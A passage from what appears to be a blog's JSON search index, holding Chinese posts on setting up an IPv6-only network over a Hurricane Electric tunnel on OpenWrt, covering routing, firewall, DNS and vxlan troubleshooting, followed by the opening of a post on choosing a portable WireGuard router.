</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u8def\u7531\u95ee\u9898","title":"\u8def\u7531\u95ee\u9898","text":"<p>6in4 tunnel \u672c\u8d28\u8fd8\u662f\u4e00\u4e2a\u4e09\u5c42\u96a7\u9053\u3002openwrt \u5bf9\u5176\u914d\u7f6e\u4e5f\u4e2d\u5c11\u4e86\u4e00\u4e2a\u53eb\u505a source routing \u7684\u9009\u9879\uff08dhcpv6 \u548c pppoe \u90fd\u6709\u8be5\u9009\u9879\uff09\uff0c\u4f5c\u7528\u662f\u4f1a\u6839\u636e\u6e90\u5730\u5740\u5339\u914d\u9ed8\u8ba4\u8def\u7531\u3002\u8fd9\u6837\u5728\u6709\u591a\u4e2a\u4e0a\u6e38 v6 \u5730\u5740\u65f6\uff0c\u53ef\u4ee5\u6839\u636e\u5305\u7684\u6e90\u5730\u5740\u9009\u62e9\u4e0d\u540c\u4e0a\u6e38\u63a5\u53e3\u51fa\u53bb\u3002</p> <p>IPv6 Sourcing routing: Automatically handle multiple uplink interfaces using source-based policy routing.</p> <p>\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\uff0c\u52a0\u4e0a\u6211\u4eec\u5173\u95ed\u4e86\u9ed8\u8ba4\u8def\u7531\uff0c\u56e0\u6b64\u6b64\u65f6\u6ca1\u6709 ipv6 \u5305\u4f1a\u4ece\u96a7\u9053\u8def\u7531\u51fa\u53bb\u3002</p> <p>\u7531\u4e8e HE tunnel \u7684 prefix \u662f\u4e0d\u4f1a\u53d8\u7684\uff0c\u56e0\u6b64\u624b\u52a8\u8bbe\u7f6e\u5373\u53ef <pre><code>root@op1 \u279c  ~ ip6 ro\ndefault from 2001:470:fab1::/48 dev 6in4-HE_tunnel metric 1024 pref medium\n</code></pre></p> <p>\u56e0\u4e3a\u8fd9\u4e2a v6 \u524d\u7f00\u662f\u53ef\u8def\u7531\u7684\uff0c\u56e0\u6b64\u6211\u53ef\u4ee5\u5728\u6211\u7684 op2 \u79fb\u52a8\u5bb6\u5bbd\u7f51\u7edc\u6d4b\u8bd5 op1 lan2 \u63a5\u53e3\u7684 v6 \u662f\u5426\u80fd\u901a\u3002</p> <p>\u679c\u7136\u662f\u80fd\u901a\u7684\uff0c\u4e0d\u8fc7\u5ef6\u8fdf\u6765\u5230\u4e86 569ms\uff0c\u611f\u89c9\u6765\u56de\u4e86\u4e24\u4e0b\u7f8e\u56fd\u3002\u795e\u5947\u7684\u662f op2 lan \u4e0b\u8bbe\u5907\u5ef6\u8fdf\u53cd\u800c\u66f4\u4f4e</p> <p>op2 \u8def\u7531\u5668\u4e0a\u6d4b\u8bd5 <pre><code>root@op2 \u279c  ping 2001:470:fab1:0:be24:11ff:fec1:6c9d\nPING 2001:470:fab1:0:be24:11ff:fec1:6c9d (2001:470:fab1:0:be24:11ff:fec1:6c9d): 56 data bytes\n\n--- 2001:470:fab1:0:be24:11ff:fec1:6c9d ping statistics ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 562.041/569.224/594.678 ms\n</code></pre></p> <p>op2 lan \u4e0b\u8bbe\u5907\u6d4b\u8bd5\uff0c\u5ef6\u8fdf\u53ea\u6709 338 ms <pre><code>$ ping 2001:470:fab1:0:be24:11ff:fec1:6c9d -t\n\u6b63\u5728 Ping 2001:470:fab1:0:be24:11ff:fec1:6c9d \u5177\u6709 32 \u5b57\u8282\u7684\u6570\u636e:\n2001:470:fab1:0:be24:11ff:fec1:6c9d \u7684 Ping \u7edf\u8ba1\u4fe1\u606f:\n    \u6570\u636e\u5305: \u5df2\u53d1\u9001 = 15\uff0c\u5df2\u63a5\u6536 = 15\uff0c\u4e22\u5931 = 0 (0% \u4e22\u5931)\uff0c\n\u5f80\u8fd4\u884c\u7a0b\u7684\u4f30\u8ba1\u65f6\u95f4(\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d):\n    \u6700\u77ed = 334ms\uff0c\u6700\u957f = 369ms\uff0c\u5e73\u5747 = 338ms\n</code></pre></p> <p>\u6293\u5305\u90fd\u662f\u4ece pppoe-wan \u53e3\u51fa\u53bb\u7684\uff0c\u611f\u89c9\u552f\u4e00\u533a\u522b\u5c31\u662f src ip \u4e0d\u540c\u3002\u6682\u4e0d\u6e05\u695a\u4e3a\u4f55\u5ef6\u8fdf\u6709\u533a\u522b\u3002 <pre><code>root@op2 \u279c  ~ tcpdump -ni any icmp6 and host 2001:470:fab1:0:be24:11ff:fec1:6c9d\n18:19:59.885930 pppoe-wan In  IP6 2001:470:fab1:0:be24:11ff:fec1:6c9d &gt; 2409:8a30:4ad:d140::10: ICMP6, echo reply, id 41070, seq 18, length 64\n18:20:00.324036 pppoe-wan Out IP6 2409:8a30:4ad:d140::10 &gt; 2001:470:fab1:0:be24:11ff:fec1:6c9d: ICMP6, echo request, id 41070, seq 19, length 64\n\n18:20:06.662907 eth1  In  IP6 2409:8a30:4ad:d140:5dfe:907a:ae21:23e8 &gt; 2001:470:fab1:0:be24:11ff:fec1:6c9d: ICMP6, echo request, id 1, seq 129, length 40\n18:20:06.662958 pppoe-wan Out IP6 2409:8a30:4ad:d140:5dfe:907a:ae21:23e8 &gt; 2001:470:fab1:0:be24:11ff:fec1:6c9d: ICMP6, echo request, id 1, seq 129, length 40\n18:20:06.996932 pppoe-wan In  IP6 2001:470:fab1:0:be24:11ff:fec1:6c9d &gt; 2409:8a30:4ad:d140:5dfe:907a:ae21:23e8: ICMP6, echo reply, id 1, seq 129, length 40\n18:20:06.996975 eth1  Out IP6 2001:470:fab1:0:be24:11ff:fec1:6c9d &gt; 2409:8a30:4ad:d140:5dfe:907a:ae21:23e8: ICMP6, echo reply, id 1, seq 129, length 40\n</code></pre></p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u9632\u706b\u5899\u95ee\u9898rs-ra-\u4e0d\u901a","title":"\u9632\u706b\u5899\u95ee\u9898\uff1aRS, RA \u4e0d\u901a","text":"<p>\u521a\u5f00\u59cb\u7ed9\u521b\u5efa\u7684 lan \u5206\u914d\u7684\u4e00\u4e2a\u5355\u72ec\u7684\u9632\u706b\u5899 zone\uff0c\u7ed3\u679c\u53d1\u73b0 op1 lan \u4e0b\u8bbe\u5907\u90fd\u65e0\u6cd5\u83b7\u5f97 ipv6 \u5730\u5740\u3002\u4f46\u662f op1 \u4e0a lan \u63a5\u53e3\u6709 ipv6 \u5730\u5740\uff08\u5e76\u4e14\u6d4b\u8bd5\u662f\u80fd\u591f\u901a\u8fc7 HE tunnel \u8bbf\u95ee\u7f51\u7edc\u7684\uff09</p> <p>op1 \u4e0a\u6293\u5305\u662f\u80fd\u770b\u5230 lan \u4e0b\u8bbe\u5907\u53d1\u9001\u4e86 RS \u8bf7\u6c42\u7684\uff0c\u4f46\u662f\u8def\u7531\u5668\u6ca1\u6709\u8fd4\u56de RA\u3002\u56e0\u6b64\u6000\u7591\u662f\u9632\u706b\u5899\u95ee\u9898\u3002</p> <p>\u53d1\u73b0\u6211\u521b\u5efa\u7684\u9632\u706b\u5899 input \u9ed8\u8ba4\u662f reject\uff0c\u8fd9\u5bfc\u81f4 lan \u4e0b\u8bbe\u5907\u65e0\u6cd5\u8bbf\u95ee\u8def\u7531\u5668\u81ea\u8eab\u3002\u53ef\u80fd\u8fd9\u4f7f\u5f97\u8def\u7531\u5668\u63a5\u6536\u4e0d\u5230\u6765\u81ea\u8bbe\u5907\u7684\u6240\u6709 icmp6 \u5305\uff0c\u800c ipv6 \u5927\u91cf\u4f9d\u8d56 icmp6 \u8fdb\u884c\u5de5\u4f5c\uff0c\u56e0\u6b64\u8fd9\u53ef\u80fd\u5c31\u662f\u539f\u56e0\u3002</p> <p>\u8bbe\u7f6e\u6210 accept \u540e\uff0c\u679c\u7136 lan \u4e0b\u7684\u8bbe\u5907\u5c31\u80fd\u83b7\u5f97\u83b7\u5f97 ipv6 \u5730\u5740\u4e86\u3002</p> <p>\u601d\u8003\u540e\uff0c\u53d1\u73b0\u6211\u8fd9\u91cc\u521b\u5efa\u7684 lan2 \u548c\u6211 \u539f\u672c\u7684 lan \u7684\u884c\u4e3a\u57fa\u672c\u662f\u4e00\u6478\u4e00\u6837\u7684\u3002\u6211\u5bf9\u539f\u672c lan \u7684\u63a7\u5236\u4e5f\u9002\u7528\u4e8e lan2\uff0c\u56e0\u6b64\u7b80\u5355\u8d77\u89c1\uff0c\u6211\u5c06 HE_tunnel \u5212\u5206\u4e3a WAN\uff0clan2 \u5212\u5206\u4e3a LAN\u3002</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#dns-\u95ee\u9898","title":"DNS \u95ee\u9898","text":"<p>\u73b0\u5728 lan \u4e0b\u8bbe\u5907\u80fd\u83b7\u5f97 ipv6 \u5730\u5740\uff0c\u4f46\u662f\u8fd8\u662f\u4e0d\u80fd\u4e0a\u7f51\u3002\u539f\u56e0\u6709\u8fd9\u4e9b</p> <ul> <li>\u9ed8\u8ba4 dns \u4e3a op1 \u8def\u7531\u5668 lan2 \u63a5\u53e3 ipv6 \u5730\u5740\uff0c\u4f7f\u7528\u8be5\u63a5\u53e3\u89e3\u6790\uff08\u56fd\u5916\u57df\u540d\uff09\u4f1a\u5f97\u5230 fake-ip</li> <li>\u624b\u52a8\u6539\u7528\u5176\u5b83 dns\uff0c\u4ecd\u7136\u4f1a\u88ab\u52ab\u6301</li> </ul>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#dns-\u4e0b\u53d1","title":"dns \u4e0b\u53d1","text":"<p>openwrt \u4e0b\u53d1\u4e86\u672c\u5730\u63a5\u53e3\u4f5c\u4e3a dns\uff0c\u6211\u7684\u672c\u5730 dns \u4f7f\u7528\u4e86 fake ip \u6280\u672f\uff0c\u6ca1\u6cd5\u76f4\u63a5\u4f7f\u7528</p> <p>\u89e3\u51b3\uff1aopenwrt lan \u63a5\u53e3\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 dns</p> <p>\u6548\u679c <pre><code>\u65e0\u7ebf\u5c40\u57df\u7f51\u9002\u914d\u5668 WLAN:\n\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n   \u63cf\u8ff0. . . . . . . . . . . . . . . : Intel(R) Wi-Fi 6 AX201 160MHz\n   \u7269\u7406\u5730\u5740. . . . . . . . . . . . . : 28-11-A8-27-40-3E\n   DHCP \u5df2\u542f\u7528 . . . . . . . . . . . : \u662f\n   \u81ea\u52a8\u914d\u7f6e\u5df2\u542f\u7528. . . . . . . . . . : \u662f\n   IPv6 \u5730\u5740 . . . . . . . . . . . . : 2001:470:fabxxxx:9b56(\u9996\u9009)\n   \u4e34\u65f6 IPv6 \u5730\u5740. . . . . . . . . . : 2001:470:fabxxxx:f4ba(\u9996\u9009)\n   \u672c\u5730\u94fe\u63a5 IPv6 \u5730\u5740. . . . . . . . : fe80::47f7:23bf:d0d9:506%3(\u9996\u9009)\n   \u81ea\u52a8\u914d\u7f6e IPv4 \u5730\u5740  . . . . . . . : 169.254.23.70(\u9996\u9009)\n   \u5b50\u7f51\u63a9\u7801  . . . . . . . . . . . . : 255.255.0.0\n   \u9ed8\u8ba4\u7f51\u5173. . . . . . . . . . . . . : fe80::9cc5:xxxx:8c2c%3\n   DHCPv6 IAID . . . . . . . . . . . : 69734824\n   DHCPv6 \u5ba2\u6237\u7aef DUID  . . . . . . . : 00-01-00-01-29-89-29-F7-28-11-A8-27-40-3E\n   DNS \u670d\u52a1\u5668  . . . . . . . . . . . : 2001:4860:4860::8888\n   TCPIP \u4e0a\u7684 NetBIOS  . . . . . . . : \u5df2\u542f\u7528\n</code></pre></p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#dns-\u52ab\u6301","title":"dns \u52ab\u6301","text":"<p>\u6211\u7684 openwrt \u4f7f\u7528\u4e86\u900f\u660e\u4ee3\u7406\uff0c\u52ab\u6301\u4e86 udp 53 \u7684 dns</p> <p>\u89e3\u51b3\uff1a\u6dfb\u52a0\u7ed5\u8fc7 openclash \u7684 nft \u89c4\u5219</p> <pre><code>nft insert rule inet fw4 dstnat udp dport 53 ip daddr {223.5.5.5, 119.29.29.29, 8.8.8.8} return comment \"Disable_OpenClash_DNS_Hijack\"\n\nnft insert rule inet fw4 dstnat udp dport 53 ip6 daddr {2001:4860:4860::8888} return comment \"IPv6_Disable_OpenClash_DNS_Hijack\"\n</code></pre>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#dot-doh","title":"DoT, DoH?","text":"<p>\u53e6\u4e00\u79cd\u907f\u514d dns \u6c61\u67d3\u7684\u65b9\u5f0f\u662f\u4e0d\u4f7f\u7528\u660e\u6587\u7684 dns \u8bf7\u6c42\u3002\u5982 DoH\uff0c\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u8bbe\u7f6e\u3002</p> <p>\u4f46\u662f\u8bbe\u7f6e\u4e86\u540e\u53d1\u73b0\u8fd8\u662f\u4e0d\u884c\uff0c\u95ee\u9898\u8c8c\u4f3c\u5728\u4e8e\u89e3\u6790 DoH \u57df\u540d\u4e5f\u9700\u8981 dns \u8bf7\u6c42\u3002\u56e0\u6b64\u8fd8\u662f\u9700\u8981\u4f7f\u7528\u4e0a\u9762\u65b9\u6cd5\u3002</p> <p>DNS-over-TLS \u00a0|\u00a0 Public DNS \u00a0|\u00a0 Google for Developers DNS-over-HTTPS (DoH) \u00a0|\u00a0 Public DNS \u00a0|\u00a0 Google for Developers Firefox DNS-over-HTTPS | Firefox Help (mozilla.org)</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#dns-\u6c61\u67d3","title":"dns \u6c61\u67d3","text":"<p>\u89e3\u51b3\u52ab\u6301\u540e\u4e0d\u77e5\u4e3a\u4f55\u89e3\u6790 youtube \u89e3\u6790\u4e0d\u5230 ipv6 \u5730\u5740\u3002</p> <pre><code>yfy@kali:~$ nslookup www.youtube.com\nServer:         2001:4860:4860::8888\nAddress:        2001:4860:4860::8888#53\n\nNon-authoritative answer:\nName:   www.youtube.com\nAddress: 31.13.68.169\nName:   www.youtube.com\nAddress: 2001::1\n</code></pre> <p>\u4f46\u662f\u624b\u673a\u8fde\u63a5\u540e\uff0c\u5374\u80fd\u591f\u6b63\u5e38\u8bbf\u95ee <code>www.youtube.com</code>\uff08\u81ea\u52a8\u8df3\u8f6c\u5230 <code>m.youtube.com</code>\uff09\uff0c\u6682\u4e0d\u6e05\u695a\u539f\u56e0</p> <p>\u7406\u8bba\u4e0a\u7531\u4e8e\u6211\u5df2\u7ecf\u8bbe\u7f6e\u8ba9\u6240\u6709\u6d41\u91cf\u8d70\u96a7\u9053\uff0c\u800c\u4e14 DNS \u4f7f\u7528\u7684\u662f google \u7684\uff0c\u56e0\u6b64\u867d\u7136\u662f\u660e\u6587\u4e5f\u4e0d\u4f1a\u4ea7\u751f\u6c61\u67d3\uff1f</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u4e8c\u5c42\u7ec4\u7f51","title":"\u4e8c\u5c42\u7ec4\u7f51","text":"<p>\u7531\u4e8e HE \u9700\u8981\u6709\u516c\u7f51 ipv4\uff0c\u800c\u6211\u76ee\u524d\u53ea\u6709\u5b66\u6821\u7684\u6559\u80b2\u7f51\u6709\u516c\u7f51 ipv4\u3002\u56e0\u6b64\u5fc5\u987b\u5728 op1 \u4e0a\u624d\u80fd\u642d\u5efa\uff0c\u4f46\u662f\u6211\u60f3\u8981\u5728 op2\uff08\u51fa\u79df\u5c4b\uff09\u4e5f\u80fd\u4f7f\u7528\u3002\u4e8e\u662f\u518d\u6b21\u9700\u8981\u4ee5\u524d\u7528\u8fc7\u7684 L2 \u7ec4\u7f51\u6280\u672f\u3002</p> <p>\u4ee4\u4eba\u5403\u60ca\u7684\u4e8b\uff0c\u7531\u4e8e vlan \u7684\u9694\u79bb\u6027\uff0c\u4f7f\u5f97 L2 \u8fd9\u4e48\u5e95\u5c42\u7684\u6280\u672f\uff0c\u8981\u8ba9\u8ba9\u6d41\u91cf\u4ece\u5b66\u6821\u7cbe\u786e\u5230\u6211\u7684\u51fa\u79df\u5c4b\uff0c\u518d\u5230\u6211\u7684\u65e0\u7ebf\u8def\u7531\u5668\uff0c\u4e0d\u80fd\u5bf9\u5176\u5b83\u7f51\u7edc\u9020\u6210\u5e72\u6270\uff0c\u5c45\u7136\u53ea\u9700\u8981\u6dfb\u52a0 1 \u4e2a vid\uff0c\u70b9\u70b9\u70b9\u5c31\u884c\u4e86\u3002\u7b80\u5355\u5230\u4ee4\u4eba\u611f\u89c9\u5230 vlan \u771f\u795e\u5947</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#vxlan-\u672c\u6765\u5c31\u53ef\u4ee5\u590d\u7528\u94fe\u8def","title":"vxlan \u672c\u6765\u5c31\u53ef\u4ee5\u590d\u7528\u94fe\u8def","text":"<p>\u672c\u6765\u8fd8\u5728\u601d\u8003\u80fd\u5426\u590d\u7528\u5df2\u6709\u7684 L2 \u96a7\u9053\uff08\u539f\u672c\u5df2\u7ecf\u57fa\u4e8e wg \u4e24\u7aef\u642d\u5efa\u4e86\u4e00\u4e2a vxlan0 \u63a5\u53e3\uff09\uff0c\u6bd4\u5982\u5728\u96a7\u9053\u4e0a\u8fd0\u884c vlan \u662f\u5426\u652f\u6301\u3002\u7136\u540e\u624d\u610f\u8bc6\u5230 vxlan \u672c\u6765\u5c31\u662f vlan\uff0c\u6709\u4e00\u4e2a vid\uff0c\u56e0\u6b64\u5b8c\u5168\u53ef\u4ee5\u5728\u4e24\u7aef\u518d\u521b\u5efa\u4e00\u4e2a vxlan1\uff0c\u6307\u5b9a\u4e0d\u540c\u7684 vid \u5373\u53ef\u3002</p> <p>op2 \u6dfb\u52a0 eth3\uff0c\u5206\u914d vlan id 30</p> <p></p> <p>op2 \u9700\u8981\u589e\u52a0\u4e00\u4e2a eth3 \u8bbe\u5907\uff0c\u548c vxlan \u8bbe\u5907\u6865\u63a5\u5728\u4e00\u8d77</p> <p></p> <p>openwrt \u521b\u5efa\u7684 bridge \u8d77\u4e0d\u6765</p> <p>\u73b0\u8c61\u4e3a ip a \u770b\u4e0d\u5230 br-lan3\u3002eth3 \u4e5f\u770b\u4e0d\u5230 master \u6807\u8bb0\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a ip link \u624b\u52a8\u521b\u5efa\u3002 <pre><code>ip link add name br-lan3 type bridge\nip link set br-lan3 up              \nip link set eth3 master br-lan3     \nip link set vxlan1 master br-lan3 \n</code></pre></p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#ap-\u8282\u70b9","title":"AP \u8282\u70b9","text":"<p>trunk \u63a5\u53e3\uff08\u521a\u597d\u4f7f\u7528\u4e86\u539f\u672c\u7684 WAN \u53e3\uff0c\u8fd9\u6837\u63a5\u7ebf\u65f6\u5bb9\u6613\u8bb0\u8d77\u6765\uff09\u589e\u52a0\u4e00\u4e2a vid \u5373\u53ef\u63a5\u5165 vlan</p> <p></p> <p>\u521b\u5efa\u4e00\u4e2a interface\uff0c\u7136\u540e\u5c06 SSID \u7ed1\u5b9a\u5230\u8fd9\u4e2a interface \u4e0a\uff0c\u4e00\u5207\u5c31\u5b8c\u6210\u4e86\u3002\u8fde\u63a5\u8be5 SSID \u5373\u53ef\u8fde\u5165 ipv6 only \u7684\u7f51\u7edc\uff01</p> <p></p> <p></p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"<p>\u521a\u5f00\u59cb\u8fde\u63a5 wifi \u540e\u8fd8\u662f\u4e0d\u901a\uff0c\u6392\u67e5\u65b9\u6cd5</p> <ul> <li>op1 \u4e0a kali \u865a\u62df\u673a\u662f\u5426\u80fd\u591f\u83b7\u5f97\u5730\u5740<ul> <li>\u4e0d\u80fd -\u300bop1 \u68c0\u67e5\u9632\u706b\u5899</li> <li>\u8fd8\u662f\u4e0d\u884c\uff0c\u91cd\u542f lan2 \u63a5\u53e3</li> <li>\u80fd\uff0c\u7ee7\u7eed\u4e0b\u4e00\u6b65</li> </ul> </li> <li>op2 \u4e0a\u80fd\u5426\u901a\u8fc7 vxlan \u96a7\u9053 ping \u901a op1 br-lan2 \u7684 ipv6 \u94fe\u8def\u5730\u5740<ul> <li>\u80fd</li> </ul> </li> <li>op2 \u4e0b\u8bbe\u5907\u80fd\u5426 ping \u901aop1 br-lan2 ipv6 \u94fe\u8def\u5730\u5740<ul> <li>\u4e0d\u80fd -\u300b\u68c0\u67e5 AP \u7684 vlan \u8bbe\u7f6e\uff0c\u53d1\u73b0\u6ca1\u95ee\u9898</li> <li>op2 \u4e0a\u521b\u5efa lan3 \u63a5\u53e3\uff0c\u4f7f\u7528 dhcpv6 client \u534f\u8bae<ul> <li>\u80fd\u5426\u83b7\u5f97 v6 \u5730\u5740</li> </ul> </li> <li>AP \u4e0a\u521b\u5efa lan3 \u63a5\u53e3\uff0c\u4f7f\u7528 dhcpv6 client \u534f\u8bae<ul> <li>\u4e5f\u53ef\u4ee5\u83b7\u5f97 v6 \u5730\u5740</li> </ul> </li> </ul> </li> <li>\u6b64\u65f6\u8bbe\u5907\u7a81\u7136\u53ef\u4ee5\u901a\u8fc7 wifi \u83b7\u5f97 v6 \u5730\u5740\u4e86</li> <li>\u540e\u9762\u53d1\u73b0\uff0c\u91cd\u70b9\u68c0\u67e5 vxlan \u548c eth \u63a5\u53e3\u7684 master \u662f\u5426\u786e\u5b9e\u662f br-lan\u3002\u540e\u9762\u53c8\u9047\u5230\u4e00\u6b21\u4e0d\u901a\u7f51\uff0c\u4fbf\u662f\u8be5\u95ee\u9898\u3002\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u3002 <pre><code>ip link set dev vxlan1 master br-lan3\n</code></pre></li> </ul>","tags":["ipv6"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/","title":"\u4fbf\u643a\u8def\u7531\u5668","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5f88\u591a\u65f6\u5019\uff0c\u6211\u4eec\u60f3\u8981\u51fa\u95e8\u5728\u5916\u4e5f\u80fd\u65b9\u4fbf\u5730\u8fde\u5165\u6211\u4eec\u7684\u5185\u7f51\u3002\u6211\u6700\u8fd1\u5c31\u9047\u5230\u4e86\u5230\u670b\u53cb\u90a3\u73a9 VR \u7ed3\u679c\u4e32\u6d41\u4e0d\u6210\u529f\u7684\u95ee\u9898\u3002\u867d\u7136\u7406\u8bba\u4e0a\u6211\u53ef\u4ee5\u5728\u90a3\u6162\u6162\u914d\u7f6e wireguard \u5565\u7684\uff0c\u4f46\u662f\u901a\u5e38\u4e00\u4e0b\u5348\u5e76\u6ca1\u6709\u8fd9\u4e48\u591a\u65f6\u95f4\u8ba9\u6211\u6298\u817e\u3002\u6240\u4ee5\u5c31\u5728\u60f3\u662f\u5426\u53ef\u4ee5\u968f\u8eab\u643a\u5e26\u4e00\u4e2a\u4fbf\u643a\u8def\u7531\u5668\uff0c\u53ea\u9700\u8981\u63d2\u4e0a\u7f51\u7ebf\uff0c\u8fde\u4e0a wifi \u5c31\u80fd\u5feb\u901f\u63a5\u5165\u6211\u7684\u5185\u7f51\u5462\uff1f\u8fd9\u4fbf\u5bf9\u8def\u7531\u5668\u63d0\u51fa\u4e86\u4e00\u4e9b\u9700\u6c42\uff1a</p> <ol> <li>\u6700\u91cd\u8981\u7684\uff0c\u9700\u8981\u4fbf\u643a\u6027\uff0c\u80fd\u653e\u5165\u4e66\u5305\u91cc</li> <li>\u80fd\u5237 openwrt \u8dd1 wireguard</li> <li>\u6709 wifi 6</li> <li>\u6700\u597d\u662f\u4e3b\u7ebf openwrt</li> <li>\u6027\u80fd\u8054\u53d1\u79d1 mt7981 \u4ee5\u4e0a</li> </ol> <p>2\uff09\u548c4\uff09\u4e3b\u8981\u662f\u6211\u8bbe\u60f3\u7684\u7ec4\u7f51\u65b9\u6848\u4f1a\u7528\u5230 wireguard\uff0c\u800c\u4e00\u4e9b\u786c\u4ef6\u4e3b\u7ebf\u8fd8\u6ca1\u6709\u652f\u6301\uff08\u6bd4\u5982 360t7 \u548c wr30u \u90fd\u662f 23 \u4e0b\u534a\u5e74\u624d\u652f\u6301\u7684\uff0c\u6211\u4e70\u7684\u65f6\u5019\u8fd8\u6ca1\u6709\uff09\u3002\u867d\u7136\u6709\u4e00\u4e9b\u7b2c\u4e09\u65b9\u7684 openwrt \u9b54\u6539\u7248\u56fa\u4ef6\uff0c\u6bd4\u5982 QWRT\uff0cXWRT \u7b49\u7b49\u3002\u4f46\u8fd9\u4e9b\u7cfb\u7edf\u6709\u4e00\u4e9b\u6211\u65e0\u6cd5\u63a5\u53d7\u7684\u70b9\uff0c\u6bd4\u5982\u4f7f\u7528\u95ed\u6e90 wifi \u9a71\u52a8\uff0c\u8fd9\u5bfc\u81f4\u65e0\u6cd5\u548c\u4e3b\u7ebf\u7684 openwrt \u7ec4 mesh \u548c fast roaming \u7b49\u3002\u53e6\u5916 wireguard \u9700\u8981\u5185\u6838\u6a21\u5757\uff0c\u5982\u679c\u7b2c\u4e09\u65b9\u56fa\u4ef6\u6ca1\u6709\u7684\u8bdd\uff0c\u4e5f\u6ca1\u6cd5\u81ea\u5df1\u5b89\u88c5\u3002</p> <p>3\uff09\u548c 5\uff09\u4e3b\u8981\u662f\u56e0\u4e3a VR \u4e32\u6d41\u5bf9\u4e8e\u5e26\u5bbd\u8981\u6c42\u662f\u6bd4\u8f83\u9ad8\u7684\uff0c\u5728\u4e00\u4e9b\u9ad8\u7aef\u786c\u4ef6\u60c5\u51b5\u4e0b\uff0c\u7801\u7387\u8bbe\u7f6e\u6210 500 mbps \u90fd\u662f\u53ef\u884c\u7684\u3002\u6211\u7684\u786c\u4ef6\u4e00\u822c 60 - 100 Mbps \u5c31\u591f\u4e86\u3002\u7531\u4e8e wg \u9700\u8981\u52a0\u89e3\u5bc6\u662f\u9700\u8981\u5403\u8f83\u591a CPU \u8d44\u6e90\u7684\uff0cmt7981 \u80fd\u591f\u8dd1\u5230 350-400 Mbps \u5de6\u53f3\uff08\u89c1cyyself/wg-bench: WireGuard Benchmark using netns and iperf3 (github.com)\uff09\u3002\u800c\u7ecf\u5178\u7684 mt7261 MIPS SoC \u5219\u53ea\u80fd\u8dd1\u5230 100 Mbps \u5de6\u53f3\u5c31\u660e\u663e\u4e0d\u591f\u7528\u4e86\u3002\u56e0\u6b64\u4e3a\u4e86\u4fdd\u969c\u6709\u8f83\u597d\u4f53\u9a8c\uff0cwifi 6 \u548c mt7981 \u6211\u89c9\u5f97\u662f\u4e2a\u57fa\u51c6\u7ebf\u4e86\u3002</p> <p>\u6700\u7ec8\u5b9e\u73b0\u7684\u6548\u679c</p> <ul> <li>\u8bbe\u5907\u901a\u8fc7 wg0 \u63a5\u53e3\u8fde\u63a5\u5165\u6211\u7684\u5185\u7f51</li> <li>\uff08\u4e09\u5c42\u63a5\u5165\uff09\u8fde\u63a5 5G wifi SSID1\uff0c\u88ab\u5206\u914d\u4e00\u4e2a\u672c\u5730\u5c40\u57df\u7f51\u5730\u5740 192.168.1.x\uff0c\u7136\u540e\u901a\u8fc7 wg0 NAT \u540e\u4e0a\u7f51</li> <li>\uff08\u4e8c\u5c42\u63a5\u5165\uff09\u8fde\u63a5 5G wifi SSID2\uff0c\u901a\u8fc7 vxlan \u4e8c\u5c42\u63a5\u5165\u6211\u7684 op1 \u5185\u7f51\uff0c\u83b7\u5f97 op1 \u7684\u5185\u7f51\u5730\u5740</li> </ul> 